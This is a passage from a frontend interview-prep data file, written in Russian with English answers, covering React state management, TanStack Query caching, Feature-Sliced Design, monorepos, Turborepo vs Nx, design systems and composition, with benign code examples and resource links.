          interviewAnswerEn:
            "If a value can be fully and unambiguously computed from already-existing props/state at any point in time, with no extra information needed, it's a derived value and doesn't need its own state slot. A red flag is a synchronizing useEffect that 'updates one state whenever another changes' — that's usually a sign one of the two states is redundant and should just be a computation instead.",
          pitfalls: [
            "Синхронизировать derived state через useEffect вместо простого вычисления в рендере — источник трудноуловимых багов рассинхронизации.",
            "Забывать useMemo для действительно дорогих производных вычислений, из-за чего они пересчитываются на каждый несвязанный рендер.",
          ],
          practiceTask:
            "Найдите в любом своём компоненте useEffect, который синхронизирует одно состояние с другим, и перепишите его как обычное вычисление (при необходимости — с useMemo).",
          resources: {
            docs: [
              { title: "Choosing the State Structure — React docs", url: "https://react.dev/learn/choosing-the-state-structure" },
            ],
            articles: [
              { title: "Don't Sync State. Derive It! (Kent C. Dodds)", url: "https://kentcdodds.com/blog/dont-sync-state-derive-it" },
              { title: "You Might Not Need an Effect — React docs", url: "https://react.dev/learn/you-might-not-need-an-effect" },
            ],
          },
        },
      },
      {
        id: "state-local-vs-global",
        title: "Local vs Global State",
        content: {
          title: "Local vs Global State",
          shortExplanation:
            "Локальное состояние живёт внутри одного компонента и не нужно нигде больше; глобальное — используется многими несвязанными компонентами в разных частях дерева.",
          detailedExplanation:
            "Главный принцип — состояние должно жить максимально близко к тому месту, где оно используется (co-location), и подниматься выше по дереву (lifting state up) или в глобальное хранилище только тогда, когда это реально необходимо нескольким удалённым друг от друга компонентам. Преждевременный перевод всего в глобальный store (Redux/Zustand) усложняет код, добавляет лишнюю связанность и может провоцировать ненужные ре-рендеры в местах, не связанных с изменением.",
          codeExample:
            "// Состояние открытости дропдауна — чисто локальное, не нужно в глобальном сторе\nfunction Dropdown() {\n  const [isOpen, setIsOpen] = useState(false);\n  return <div onClick={() => setIsOpen(v => !v)}>{/* ... */}</div>;\n}\n\n// Данные текущего пользователя — нужны в Header, Sidebar, Profile -> глобальный store",
          interviewQuestion: "Какой критерий помогает решить, поднимать ли состояние в глобальный store?",
          interviewAnswerRu:
            "Главный вопрос — используется ли это состояние компонентами, у которых нет общего близкого родителя, через которого пропсы разумно прокинуть, или изменение этого состояния должно быть видно в нескольких независимых частях приложения одновременно (например, авторизация пользователя, тема оформления, содержимое корзины). Если состояние нужно только одному компоненту и его прямым детям — локальный useState почти всегда лучше глобального store.",
          interviewAnswerEn:
            "The key question is whether this state is used by components with no reasonably close common ancestor to pass props through, or whether a change to it needs to be visible across several independent parts of the app at once (user auth, theme, cart contents). If the state is only needed by one component and its direct children, local useState is almost always the better choice over a global store.",
          pitfalls: [
            "Складывать в глобальный store всё состояние 'на всякий случай' — усложняет отладку и добавляет ненужную связанность между частями приложения.",
            "Слишком долго прокидывать пропсы через много уровней (prop drilling) вместо того, чтобы признать состояние действительно глобальным.",
          ],
          practiceTask:
            "Возьмите один Zustand-store из вашего проекта и проверьте каждое поле: правда ли оно нужно нескольким несвязанным компонентам, или его можно было бы сделать локальным useState.",
          resources: {
            docs: [
              { title: "Sharing State Between Components — React docs", url: "https://react.dev/learn/sharing-state-between-components" },
            ],
            articles: [
              { title: "Application State Management with React (Kent C. Dodds)", url: "https://kentcdodds.com/blog/application-state-management-with-react" },
            ],
          },
        },
      },
      {
        id: "state-form-state",
        title: "Form State",
        content: {
          title: "Form State (состояние форм)",
          shortExplanation:
            "Состояние формы — значения полей, ошибки валидации, флаги touched/dirty и статус отправки — обычно управляется отдельно от остального состояния приложения из-за своей специфики.",
          detailedExplanation:
            "Формы обновляются очень часто (на каждое нажатие клавиши), требуют валидации (на уровне поля и всей формы), должны различать 'поле ещё не тронуто' и 'поле тронуто, но невалидно', и часто содержат вложенные и массивоподобные структуры (список телефонов, динамические поля). Из-за этой специфики для форм часто используют отдельные библиотеки (React Hook Form, Formik) вместо того, чтобы хранить состояние формы в общем сторе (Zustand/Redux) — это позволяет минимизировать ре-рендеры (например, React Hook Form вообще не ре-рендерит компонент на каждое нажатие клавиши, используя неконтролируемые инпуты и рефы).",
          codeExample:
            "const { register, handleSubmit, formState: { errors } } = useForm();\n\n<form onSubmit={handleSubmit(onSubmit)}>\n  <input {...register('email', { required: 'Email обязателен' })} />\n  {errors.email && <span>{errors.email.message}</span>}\n</form>",
          interviewQuestion: "Почему для форм часто не используют общий глобальный store вроде Redux?",
          interviewAnswerRu:
            "Состояние формы обновляется очень часто (буквально на каждое нажатие клавиши), и если хранить его в глобальном сторе, каждое изменение может вызывать ре-рендер множества подписанных компонентов, а не только самой формы. Специализированные библиотеки для форм решают это через неконтролируемые инпуты и рефы, ре-рендеря только те части UI, которые реально должны обновиться (например, конкретное сообщение об ошибке), а не всю форму или тем более всё приложение.",
          interviewAnswerEn:
            "Form state updates extremely often (literally on every keystroke), and storing it in a global store could trigger a re-render of every subscribed component on each change, not just the form. Dedicated form libraries solve this using uncontrolled inputs and refs, re-rendering only the specific UI pieces that actually need to update — like one error message — rather than the whole form or the whole app.",
          pitfalls: [
            "Хранить каждое поле формы в отдельном useState — при росте формы это быстро становится неуправляемым.",
            "Путать 'невалидно' и 'ещё не тронуто пользователем' — показывать ошибки на пустой только что открытой форме.",
          ],
          practiceTask:
            "Реализуйте простую форму логина (email + password) с валидацией через React Hook Form (или руками через useState + собственную функцию валидации) и корректной обработкой touched/errors.",
          resources: {
            docs: [
              { title: "React Hook Form: Get Started — official docs", url: "https://react-hook-form.com/get-started" },
            ],
            articles: [
              { title: "React Hook Form vs. React 19 (LogRocket)", url: "https://blog.logrocket.com/react-hook-form-vs-react-19/" },
            ],
          },
        },
      },
      {
        id: "state-jotai-vs-mobx",
        title: "Jotai / MobX / когда что выбирать",
        content: {
          title: "Jotai, MobX и выбор между стейт-менеджерами",
          shortExplanation:
            "Jotai — атомарный стейт-менеджер, где состояние строится из маленьких независимых 'атомов', а компонент подписывается только на нужные ему атомы; MobX — реактивный стейт-менеджер, где мутировать состояние можно напрямую, а подписка и ре-рендер происходят автоматически через прокси-объекты.",
          detailedExplanation:
            "Redux/Zustand используют единое (или несколько) хранилище с явными действиями/сеттерами и неизменяемыми обновлениями (immutable updates) — состояние всегда заменяется новым объектом, а не мутируется. Jotai переворачивает модель: вместо одного большого объекта состояния есть много маленьких независимых атомов (const countAtom = atom(0)), и компонент через useAtom(countAtom) подписывается именно на этот атом — ре-рендер происходит только при изменении конкретно этого атома, что снимает необходимость вручную писать селекторы для 'подписки только на нужный кусок', характерную для Context. MobX, в свою очередь, построен вокруг мутабельности и прокси: store.count++ работает буквально как прямая мутация JS-объекта, а MobX через Proxy отслеживает, какие именно наблюдаемые (observable) поля читает конкретный компонент, и автоматически ре-рендерит только те компоненты, что реально читали изменившееся поле — за счёт этого код часто выглядит проще (нет reducer'ов, action creators), но требует привыкания к менее предсказуемой, 'магической' модели изменений по сравнению с явным неизменяемым Redux-подходом.",
          codeExample:
            "// Jotai — атомарная модель\nimport { atom, useAtom } from 'jotai';\nconst countAtom = atom(0);\nfunction Counter() {\n  const [count, setCount] = useAtom(countAtom); // подписка только на этот атом\n  return <button onClick={() => setCount(c => c + 1)}>{count}</button>;\n}\n\n// MobX — мутация + автоматическое отслеживание\nimport { makeAutoObservable } from 'mobx';\nclass CounterStore {\n  count = 0;\n  constructor() { makeAutoObservable(this); }\n  increment() { this.count++; } // прямая мутация, MobX сам решит, кого перерендерить\n}",
          whereUsed:
            "Jotai — там, где нужна тонкая гранулярность подписки без написания отдельных селекторов (много независимых кусочков UI-состояния). MobX — в проектах, где команда предпочитает объектно-ориентированный, мутабельный стиль (например, миграция с Angular/OOP-фона) и готова к менее строгой, более 'магической' модели реактивности взамен упрощённого синтаксиса.",
          interviewQuestion: "Чем модель Jotai принципиально отличается от модели Redux/Zustand?",
          interviewAnswerRu:
            "Redux/Zustand хранят состояние как один (или несколько) больших объектов, и компонент обычно подписывается на срез этого объекта через селектор, вычисляемый при каждом изменении. Jotai изначально атомарен: состояние с самого начала разбито на маленькие независимые атомы, и компонент подписывается напрямую на конкретный атом — это устраняет необходимость писать и поддерживать отдельные селекторы для гранулярной подписки, но требует по-другому спроектировать состояние с самого начала, разбивая его на независимые кусочки, а не в один большой объект.",
          interviewAnswerEn:
            "Redux/Zustand keep state as one (or a few) large objects, and a component typically subscribes to a slice of it via a selector computed on every change. Jotai is atomic from the ground up: state is split into small independent atoms from the start, and a component subscribes directly to a specific atom — this removes the need to write and maintain separate selectors for granular subscriptions, but requires designing state differently from the outset, as independent pieces rather than one big object.",
          pitfalls: [
            "Смешивать мутабельный стиль MobX с обычными React-паттернами, ожидающими неизменяемости (например, некоторые оптимизации React.memo полагаются на referential equality, которая в MobX работает иначе).",
            "Выбирать Jotai/MobX 'потому что новее/интереснее' без реальной потребности в их специфичных сильных сторонах — для большинства команд Zustand/Redux Toolkit остаются более предсказуемым выбором по умолчанию.",
          ],
        },
      },
      {
        id: "state-stale-time-vs-cache-time",
        title: "staleTime vs cacheTime (gcTime)",
        content: {
          title: "staleTime vs cacheTime (gcTime)",
          shortExplanation:
            "staleTime — сколько времени данные в кеше TanStack Query считаются 'свежими' и не требуют повторного запроса при новом обращении; cacheTime (в v5 переименован в gcTime) — сколько времени неиспользуемые данные вообще хранятся в памяти, прежде чем будут удалены сборщиком кеша.",
          detailedExplanation:
            "Пока данные 'свежие' (в пределах staleTime), TanStack Query не делает никакого сетевого запроса при монтировании нового компонента с тем же query key — просто мгновенно отдаёт закешированное значение. После истечения staleTime данные считаются 'stale', но не удаляются — они продолжают отображаться (stale-while-revalidate), пока в фоне не придёт свежий ответ. gcTime (ранее cacheTime) — совершенно отдельная настройка: она отсчитывается с момента, когда у query key не осталось ни одного активного подписчика (все компоненты, использующие этот query, размонтированы), и определяет, сколько времени данные ещё держатся в памяти 'про запас' на случай, если пользователь вернётся на этот экран, прежде чем query будет полностью удалён сборщиком мусора кеша. По умолчанию staleTime равен 0 (данные считаются устаревшими сразу же, и каждый новый маунт компонента вызывает фоновый рефетч), а gcTime по умолчанию — 5 минут.",
          codeExample:
            "useQuery({\n  queryKey: ['user', id],\n  queryFn: () => fetchUser(id),\n  staleTime: 5 * 60 * 1000, // 5 минут — данные свежие, рефетч не нужен\n  gcTime: 30 * 60 * 1000,   // 30 минут — данные держатся в памяти после ухода со страницы\n});",
          whereUsed:
            "Настройка staleTime критична для данных, которые редко меняются (справочники, профиль пользователя) — большой staleTime снижает число лишних запросов; настройка gcTime важна для экранов, между которыми пользователь часто переключается туда-обратно (табы, вкладки), чтобы не терять кеш слишком быстро.",
          interviewQuestion: "Если staleTime истёк, но gcTime — ещё нет, что увидит пользователь при повторном заходе на экран?",
          interviewAnswerRu:
            "Пользователь мгновенно увидит закешированные (уже устаревшие с точки зрения staleTime) данные — они не были удалены, потому что gcTime ещё не истёк, и данные оставались в памяти. Одновременно с показом старых данных TanStack Query запустит фоновый рефетч, потому что staleTime истёк, и как только придёт свежий ответ, интерфейс обновится — это и есть stale-while-revalidate: пользователь не видит пустого состояния загрузки, а видит нечто мгновенно, пусть и на долю секунды устаревшее.",
          interviewAnswerEn:
            "The user instantly sees the cached (now stale by staleTime's definition) data — it wasn't removed because gcTime hadn't expired yet and the data stayed in memory. At the same time as showing the old data, TanStack Query kicks off a background refetch because staleTime has expired, and once a fresh response arrives, the UI updates — that's stale-while-revalidate in action: the user never sees an empty loading state, just something instantly, even if briefly out of date.",
          pitfalls: [
            "Путать staleTime (когда нужен повторный запрос) с gcTime (когда данные вообще удаляются из памяти) — это настройки разных, независимых механизмов.",
            "Ставить staleTime: 0 везде по умолчанию, не задумываясь, что для редко меняющихся данных это создаёт постоянные лишние фоновые запросы.",
          ],
        },
      },
      {
        id: "state-request-deduplication",
        title: "Request Deduplication",
        content: {
          title: "Request Deduplication (дедупликация запросов)",
          shortExplanation:
            "Дедупликация запросов — механизм, при котором несколько одновременных обращений за одними и теми же данными (один и тот же query key) объединяются в один реальный сетевой запрос вместо того, чтобы каждый компонент делал свой независимый fetch.",
          detailedExplanation:
            "Без дедупликации, если пять разных компонентов на одной странице независимо друг от друга вызывают fetchUser(id) для одного и того же id (например, каждый через свой useEffect + useState), браузер отправит пять одинаковых сетевых запросов почти одновременно — сервер получает лишнюю нагрузку, а клиент впустую тратит сеть. TanStack Query, RTK Query и подобные библиотеки решают это на уровне query key: если несколько компонентов одновременно запрашивают один и тот же key, пока первый запрос ещё выполняется, остальные не создают новый fetch, а просто 'подписываются' на результат уже летящего запроса и получают один и тот же ответ. Это отличается от кеширования как такового (которое экономит повторные запросы для уже полученных данных) — дедупликация решает проблему именно параллельных одновременных запросов за ещё не полученными данными, до того как первый ответ вообще пришёл.",
          codeExample:
            "// Пять компонентов на одной странице вызывают одно и то же:\nfunction Avatar({ userId }) {\n  const { data } = useQuery({ queryKey: ['user', userId], queryFn: () => fetchUser(userId) });\n}\nfunction UserName({ userId }) {\n  const { data } = useQuery({ queryKey: ['user', userId], queryFn: () => fetchUser(userId) });\n}\n// TanStack Query сделает РОВНО ОДИН сетевой запрос на userId,\n// а не пять — остальные компоненты получат тот же результат.",
          whereUsed:
            "Страницы с большим количеством независимых виджетов, читающих одни и те же данные (дашборды, ленты с повторяющимися карточками пользователя), где без дедупликации легко случайно получить десятки дублирующихся запросов при первой загрузке.",
          interviewQuestion: "Как библиотеки вроде TanStack Query дедуплицируют параллельные запросы за одними и теми же данными?",
          interviewAnswerRu:
            "Библиотека связывает каждый запрос не с конкретным компонентом, а с query key — если два компонента одновременно запрашивают один и тот же key, пока по нему уже есть 'летящий' (in-flight) промис, второй вызов не создаёт новый fetch, а просто подписывается на результат того же самого промиса. Как только первый запрос завершается, оба компонента получают один и тот же ответ одновременно, и в кеш попадает единственная запись, а не два независимых результата, потенциально пришедших в разное время с возможно разными данными.",
          interviewAnswerEn:
            "The library ties each request to a query key, not to a specific component — if two components request the same key at the same time while an in-flight promise already exists for it, the second call doesn't spawn a new fetch, it just subscribes to that same promise's result. Once the first request completes, both components receive the same response simultaneously, and a single entry lands in the cache rather than two independent results that could have arrived at different times with potentially different data.",
          pitfalls: [
            "Писать собственный fetch-хук без дедупликации в проекте, где один и тот же ресурс запрашивается сразу несколькими независимыми виджетами страницы.",
            "Считать, что дедупликация решает и проблему кеширования 'надолго' — это разные механизмы: дедупликация про одновременные запросы, кеш и staleTime — про повторные запросы во времени.",
          ],
        },
      },

    ],
  },


  {
    id: "frontend-architecture",
    title: "Frontend Architecture",
    subtopics: [
      {
        id: "arch-feature-sliced",
        title: "Feature-Sliced Design",
        content: {
          title: "Feature-Sliced Design (FSD)",
          shortExplanation:
            "Feature-Sliced Design — методология организации фронтенд-кода по слоям (app, pages, widgets, features, entities, shared) и по фичам внутри слоёв, а не по техническому типу файла.",
          detailedExplanation:
            "Классическая организация 'по типу' (все компоненты в components/, весь стейт в store/, все хуки в hooks/) плохо масштабируется: чтобы понять одну фичу, приходится прыгать по десяткам папок. FSD группирует код вокруг бизнес-смысла: каждый слой ниже не может импортировать слои выше (entities не знает про features, features не знает про widgets), а внутри слоя код делится на независимые 'срезы' (например, features/add-to-cart, features/auth). Это делает границы ответственности явными и облегчает удаление/перенос целой фичи.",
          codeExample:
            "src/\n  app/          // инициализация приложения, провайдеры, роутинг\n  pages/        // страницы, композиция виджетов\n  widgets/      // крупные независимые блоки UI (Header, ProductCard)\n  features/     // конкретные пользовательские сценарии (add-to-cart, login-form)\n  entities/     // бизнес-сущности (user, product) и работа с ними\n  shared/       // переиспользуемый UI-kit, утилиты, без бизнес-логики",
          interviewQuestion: "Зачем нужны строгие правила импортов между слоями в FSD?",
          interviewAnswerRu:
            "Без строгих правил проект быстро превращается в 'спагетти', где entities начинает знать о конкретных features, а shared-компоненты — о бизнес-логике конкретной страницы. Правило 'слой может импортировать только более низкие слои' гарантирует, что низкоуровневый переиспользуемый код (shared, entities) никогда не завязан на конкретные фичи или страницы, поэтому его можно безопасно переиспользовать и тестировать в изоляции.",
          interviewAnswerEn:
            "Without strict rules, a project quickly turns into spaghetti, where entities start knowing about specific features, and shared components end up coupled to one page's business logic. The rule 'a layer may only import from layers below it' guarantees that low-level reusable code (shared, entities) is never tied to specific features or pages, so it can be safely reused and tested in isolation.",
          pitfalls: [
            "Заводить FSD-структуру в маленьком проекте, где хватило бы простой организации по фичам без строгих слоёв — лишняя церемония.",
            "Нарушать правило импортов 'снизу вверх' 'на один раз', открывая дорогу к постепенной деградации границ.",
          ],
          practiceTask:
            "Возьмите один существующий компонент из вашего проекта и определите, в какой слой FSD (shared/entities/features/widgets) он попал бы и почему.",
          resources: {
            docs: [
              { title: "Feature-Sliced Design — official docs", url: "https://feature-sliced.design/" },
            ],
            articles: [
              { title: "FSD with Next.js guide", url: "https://feature-sliced.design/docs/guides/tech/with-nextjs" },
              { title: "Container/Presentational Pattern", url: "https://www.patterns.dev/react/presentational-container-pattern" },
            ],
          },
        },
      },
      {
        id: "arch-layered",
        title: "Separation of UI and Business Logic",
        content: {
          title: "Separation of UI and Business Logic",
          shortExplanation:
            "Разделение UI и бизнес-логики означает, что компоненты отвечают только за отображение и взаимодействие, а вычисления, правила и работа с данными вынесены в отдельные функции/хуки.",
          detailedExplanation:
            "Компонент, в котором смешаны JSX, вызовы API, валидация и сложные вычисления, тяжело тестировать и переиспользовать: чтобы протестировать бизнес-правило, приходится рендерить весь компонент. Вынос логики в кастомные хуки (useCartTotal, useAuthStatus) или чистые функции (calculateDiscount, validateOrder) позволяет тестировать её независимо от UI и переиспользовать между разными компонентами представления (например, одна и та же логика для десктопной и мобильной версии страницы).",
          codeExample:
            "// Плохо: бизнес-логика (расчёт скидки) прямо внутри JSX-компонента\nfunction Cart({ items }) {\n  const total = items.reduce((sum, i) => sum + i.price, 0);\n  const discount = total > 100 ? total * 0.1 : 0;\n  return <div>{total - discount}</div>;\n}\n\n// Лучше: логика вынесена, компонент только отображает результат\nfunction useCartTotal(items) {\n  const total = items.reduce((sum, i) => sum + i.price, 0);\n  const discount = total > 100 ? total * 0.1 : 0;\n  return total - discount;\n}\nfunction Cart({ items }) {\n  return <div>{useCartTotal(items)}</div>;\n}",
          interviewQuestion: "Как разделение UI и бизнес-логики упрощает тестирование?",
          interviewAnswerRu:
            "Если бизнес-логика вынесена в чистую функцию или хук без зависимости от JSX, её можно протестировать напрямую: вызвать с разными входными данными и проверить результат, без рендеринга компонентов и работы с DOM. Это делает тесты быстрее, стабильнее (нет хрупких селекторов) и точнее указывает на то, что именно сломалось — логика или отображение.",
          interviewAnswerEn:
            "If business logic is extracted into a pure function or hook with no dependency on JSX, it can be tested directly: call it with different inputs and check the result, with no component rendering or DOM involved. This makes tests faster, more stable (no fragile selectors), and more precise about what actually broke — the logic or the rendering.",
          pitfalls: [
            "Разделять логику и UI 'ради красоты' там, где компонент и так простой — избыточная абстракция.",
            "Оставлять сложные ветвления бизнес-правил прямо в JSX (тернарники внутри тернарников) вместо вынесения в именованную функцию.",
          ],
          practiceTask:
            "Найдите в своём проекте компонент с вычислением внутри JSX (не в отдельной функции/хуке) и вынесите это вычисление в отдельную протестированную функцию.",
          resources: {
            docs: [
              { title: "Composition vs Inheritance — React docs", url: "https://legacy.reactjs.org/docs/composition-vs-inheritance.html" },
            ],
            articles: [
              { title: "Container/Presentational Pattern", url: "https://www.patterns.dev/react/presentational-container-pattern" },
              { title: "Common mistakes with React Testing Library", url: "https://kentcdodds.com/blog/common-mistakes-with-react-testing-library" },
            ],
          },
        },
      },
      {
        id: "arch-monorepo",
        title: "Monorepos",
        content: {
          title: "Monorepos (монорепозитории)",
          shortExplanation:
            "Монорепозиторий — это один git-репозиторий, в котором живут несколько связанных пакетов или приложений (например, сайт, админка и общая библиотека компонентов).",
          detailedExplanation:
            "Монорепо решает проблему переиспользования кода между несколькими приложениями одной команды: общий UI-kit, типы, утилиты лежат в отдельном пакете внутри того же репозитория и подключаются через локальные ссылки (workspace), без публикации в npm и версионирования вручную. Инструменты вроде Turborepo, Nx или pnpm workspaces добавляют кэширование сборки и запуск задач только для изменённых пакетов. Плата за это — более сложная настройка CI/CD и инструментов сборки, а также риск излишней связанности между 'независимыми' пакетами.",
          codeExample:
            "apps/\n  web/            // основной сайт, зависит от packages/ui\n  admin/          // админка, тоже зависит от packages/ui\npackages/\n  ui/             // общий UI-kit\n  eslint-config/  // общие правила линтера\n\n// В package.json web: \"dependencies\": { \"@repo/ui\": \"workspace:*\" }",
          interviewQuestion: "В чём главное преимущество монорепо перед несколькими отдельными репозиториями?",
          interviewAnswerRu:
            "Главное преимущество — мгновенное переиспользование общего кода без публикации пакетов и без версионирования: изменение в packages/ui сразу доступно во всех приложениях монорепо без npm publish и bump версии. Это также упрощает атомарные изменения сразу в нескольких приложениях (один PR меняет и библиотеку, и оба приложения, которые её используют) и даёт единые правила линтинга/сборки для всей команды.",
          interviewAnswerEn:
            "The main advantage is instant reuse of shared code without publishing packages or versioning: a change in packages/ui is immediately available to every app in the monorepo, with no npm publish or version bump needed. It also simplifies atomic changes across multiple apps at once (one PR touches both the library and the apps that use it) and gives the whole team a single set of lint/build rules.",
          pitfalls: [
            "Заводить монорепо для одного-единственного приложения без реальной потребности в переиспользовании между несколькими проектами.",
            "Не настраивать кэширование сборки (Turborepo/Nx) — CI начинает пересобирать вообще всё при любом небольшом изменении.",
          ],
          practiceTask:
            "Опишите (в виде дерева папок) структуру монорепо для проекта из сайта, админки и общей библиотеки компонентов, указав, какие пакеты от каких зависят.",
          resources: {
            docs: [
              { title: "Turborepo — official docs", url: "https://turborepo.dev/docs" },
            ],
            articles: [
              { title: "Monorepo Explained (monorepo.tools)", url: "https://monorepo.tools/" },
            ],
          },
        },
      },
      {
        id: "arch-turborepo-vs-nx",
        title: "Turborepo vs Nx",
        content: {
          title: "Turborepo vs Nx",
          shortExplanation:
            "Turborepo и Nx — оба ускоряют работу монорепо через кэширование результатов задач и запуск только затронутых изменением пакетов, но Nx дополнительно даёт готовые генераторы, плагины под конкретные фреймворки и граф зависимостей 'из коробки', тогда как Turborepo — более минималистичный инструмент, сфокусированный почти исключительно на оркестрации и кэшировании задач.",
          detailedExplanation:
            "Оба инструмента решают одну и ту же базовую проблему монорепо: без них любая CI-команда (например, npm run build) пересобирает вообще всё, даже если изменился один файл в одном пакете — это медленно и не масштабируется на десятки пакетов. Оба строят граф зависимостей между пакетами (кто от кого зависит), запускают задачи в правильном топологическом порядке (сначала собрать библиотеку, потом приложения, которые от неё зависят) и кэшируют результат каждой задачи по хешу её входных файлов — если хеш не изменился, задача просто берёт результат из кэша (локального или удалённого/remote cache) вместо повторного выполнения. Turborepo сознательно минималистичен: одна конфигурация (turbo.json), описывающая, какие задачи от каких зависят и что кэшировать, при этом сама сборка/тесты/линт остаются обычными npm/pnpm-скриптами каждого пакета — Turborepo не навязывает свою структуру проекта или инструменты сборки. Nx исторически более 'батарейки включены': генераторы кода (nx generate создаёт новый компонент/библиотеку по шаблону), плагины с готовыми пресетами под конкретные фреймворки (React, Angular, Next.js), встроенная визуализация графа зависимостей (nx graph) и более строгие правила модульных границ между пакетами (module boundaries, которые можно enforced через линтер) — это даёт больше готовой инфраструктуры для крупных организаций, но и более выраженный 'свой путь', с которым нужно считаться. На практике выбор часто сводится к следующему: Turborepo подходит, если команда хочет лёгкий инструмент поверх уже существующей структуры проекта и своих npm-скриптов; Nx выгоднее для крупных организаций, которым нужны единые генераторы, enforced-границы между модулями и готовая интеграция с конкретными фреймворками с первого дня.",
          codeExample:
            "// turbo.json — минимальная конфигурация Turborepo\n{\n  \"tasks\": {\n    \"build\": {\n      \"dependsOn\": [\"^build\"], // сначала собрать зависимости (^ = зависимости пакета)\n      \"outputs\": [\"dist/**\"]\n    },\n    \"test\": {\n      \"dependsOn\": [\"build\"]\n    }\n  }\n}\n\n// Запуск: пересоберёт и протестирует только пакеты,\n// затронутые изменением, используя кэш для остальных\n// turbo run build test",
          whereUsed:
            "Монорепо с несколькими приложениями и общими пакетами (UI-kit, утилиты, типы), CI-пайплайны, где важно не пересобирать весь проект при каждом небольшом изменении, крупные организации с десятками команд, которым нужны единые стандарты структуры проекта (чаще решается через Nx).",
          interviewQuestion: "Как именно Turborepo или Nx определяют, что задачу можно взять из кэша, а не выполнять заново?",
          interviewAnswerRu:
            "Инструмент вычисляет хеш от всех входных данных, влияющих на результат задачи: содержимое файлов пакета, содержимое файлов пакетов, от которых он зависит, версия используемых инструментов, переменные окружения и сама команда задачи. Если этот хеш уже встречался раньше (совпадает с ключом в локальном или удалённом кэше), результат задачи (например, содержимое папки dist) берётся из кэша мгновенно, без реального запуска сборки — если хеш новый (что-то из входных данных изменилось), задача выполняется заново, а её результат сохраняется в кэш под новым хешем для последующего переиспользования.",
          interviewAnswerEn:
            "The tool computes a hash of everything that affects the task's outcome: the package's file contents, the contents of the packages it depends on, the tool versions in use, relevant environment variables, and the task command itself. If that hash has been seen before (matches a key in the local or remote cache), the task's output (say, the contents of a dist folder) is pulled from the cache instantly, without actually running the build — if the hash is new (something in the inputs changed), the task runs for real, and its result is stored under the new hash for future reuse.",
          pitfalls: [
            "Не настраивать outputs/inputs задачи точно — если инструмент не знает, какие файлы реально влияют на результат, кэш может быть либо неоправданно 'протухать' слишком часто, либо, хуже, отдавать устаревший результат, когда реально значимый файл не был учтён в хеше.",
            "Полагаться только на локальный кэш без настройки remote cache — тогда каждый новый CI-раннер или новый разработчик не получает выгоды от уже посчитанных кем-то результатов.",
          ],
          practiceTask:
            "Настройте turbo.json (или nx.json) для монорепо из трёх пакетов (одна общая библиотека и два приложения, зависящих от неё), чтобы build одного приложения не пересобирал библиотеку, если её код не менялся.",
          resources: {
            docs: [
              { title: "Turborepo — official docs", url: "https://turborepo.dev/docs" },
              { title: "Nx — official docs", url: "https://nx.dev/getting-started/intro" },
            ],
            articles: [
              { title: "Monorepo Explained (monorepo.tools)", url: "https://monorepo.tools/" },
            ],
          },
        },
      },
      {
        id: "arch-design-system",
        title: "Design Systems",
        content: {
          title: "Design Systems (дизайн-системы)",
          shortExplanation:
            "Дизайн-система — это набор переиспользуемых UI-компонентов, токенов (цвета, отступы, типографика) и правил их использования, общий для всех продуктов компании.",
          detailedExplanation:
            "Дизайн-система решает две задачи одновременно: визуальную согласованность продукта (одна кнопка, одни отступы, один набор цветов везде) и ускорение разработки (не изобретать заново Button/Modal/Input в каждой новой фиче). Технически это обычно отдельный пакет с UI-компонентами поверх дизайн-токенов (переменных для цвета/отступов/шрифтов), который версионируется отдельно от продуктовых приложений и документируется, часто через Storybook.",
          codeExample:
            "// Токены дизайн-системы\nexport const tokens = {\n  color: { primary: '#3b6ff2', danger: '#e5484d' },\n  spacing: { sm: '8px', md: '16px', lg: '24px' },\n};\n\n// Компонент использует токены, а не 'магические' значения\nfunction Button({ variant = 'primary', children }) {\n  return <button style={{ background: tokens.color[variant] }}>{children}</button>;\n}",
          interviewQuestion: "Почему дизайн-токены лучше, чем захардкоженные значения цвета/отступов в каждом компоненте?",
          interviewAnswerRu:
            "Токены — это единственный источник правды (single source of truth) для визуальных значений: если бренд-цвет меняется, достаточно поменять его в одном месте (tokens.color.primary), и изменение подхватят все компоненты, которые его используют. Захардкоженные значения (#3b6ff2 в 50 разных файлах) требуют ручного поиска и замены везде, с риском что-то пропустить и получить визуальную несогласованность.",
          interviewAnswerEn:
            "Tokens are the single source of truth for visual values: if the brand color changes, you update it in one place (tokens.color.primary) and every component using it picks up the change automatically. Hardcoded values (#3b6ff2 scattered across 50 files) require manually finding and replacing every occurrence, with a real risk of missing some and ending up with visual inconsistency.",
          pitfalls: [
            "Строить полноценную дизайн-систему для одного небольшого продукта без перспективы переиспользования — избыточные затраты.",
            "Позволять продуктовым командам 'обходить' дизайн-систему точечными хардкодами 'just this once' — со временем система теряет смысл.",
          ],
          practiceTask:
            "Выпишите 5 захардкоженных значений цвета/отступов из любого своего проекта и превратите их в именованные токены, используемые через переменные.",
          resources: {
            docs: [
              { title: "Design Systems 101 — Nielsen Norman Group", url: "https://www.nngroup.com/articles/design-systems-101/" },
            ],
            articles: [
              { title: "Atomic Design — Brad Frost", url: "https://bradfrost.com/blog/post/atomic-web-design/" },
            ],
          },
        },
      },
      {
        id: "arch-composition",
        title: "Composition over Inheritance",
        content: {
          title: "Composition over Inheritance",
          shortExplanation:
            "В React переиспользование поведения между компонентами достигается через композицию (передачу компонентов как пропсов/children), а не через наследование классов.",
          detailedExplanation:
            "React изначально спроектирован вокруг композиции: вместо того чтобы создавать BaseModal и наследовать от него ConfirmModal, InfoModal и т.д., в React принято передавать переменные части как children или как специализированные пропсы (например, <Modal footer={<Button />} />). Это даёт большую гибкость, чем наследование: компонент можно 'собрать' из разных кусков в разных местах приложения без создания новых классов и без хрупкой иерархии наследования, где изменение базового класса рискует сломать всех наследников.",
          codeExample:
            "// Композиция вместо наследования\nfunction Modal({ title, children, footer }) {\n  return (\n    <div className='modal'>\n      <h2>{title}</h2>\n      <div>{children}</div>\n      <div className='modal-footer'>{footer}</div>\n    </div>\n  );\n}\n\n<Modal title='Удалить?' footer={<button>Подтвердить</button>}>\n  Это действие необратимо.\n</Modal>",
          interviewQuestion: "Почему официальная документация React рекомендует композицию вместо наследования компонентов?",
          interviewAnswerRu:
            "Наследование компонентов создаёт жёсткую связь между базовым и производным компонентом: изменение базового класса может неожиданно сломать поведение всех наследников, а сама иерархия становится сложной для понимания при росте числа вариантов. Композиция (передача children, render props, специализированных пропсов-компонентов) даёт те же возможности переиспользования, но через явные, локальные связи — понятно, что именно передаётся и куда, без скрытой цепочки наследования.",
          interviewAnswerEn:
            "Component inheritance creates a tight coupling between the base and derived component: changing the base class can unexpectedly break every subclass's behavior, and the hierarchy becomes hard to follow as variants multiply. Composition (passing children, render props, specialized component props) gives the same reuse benefits but through explicit, local relationships — it's clear exactly what's being passed and where, with no hidden inheritance chain.",
          pitfalls: [
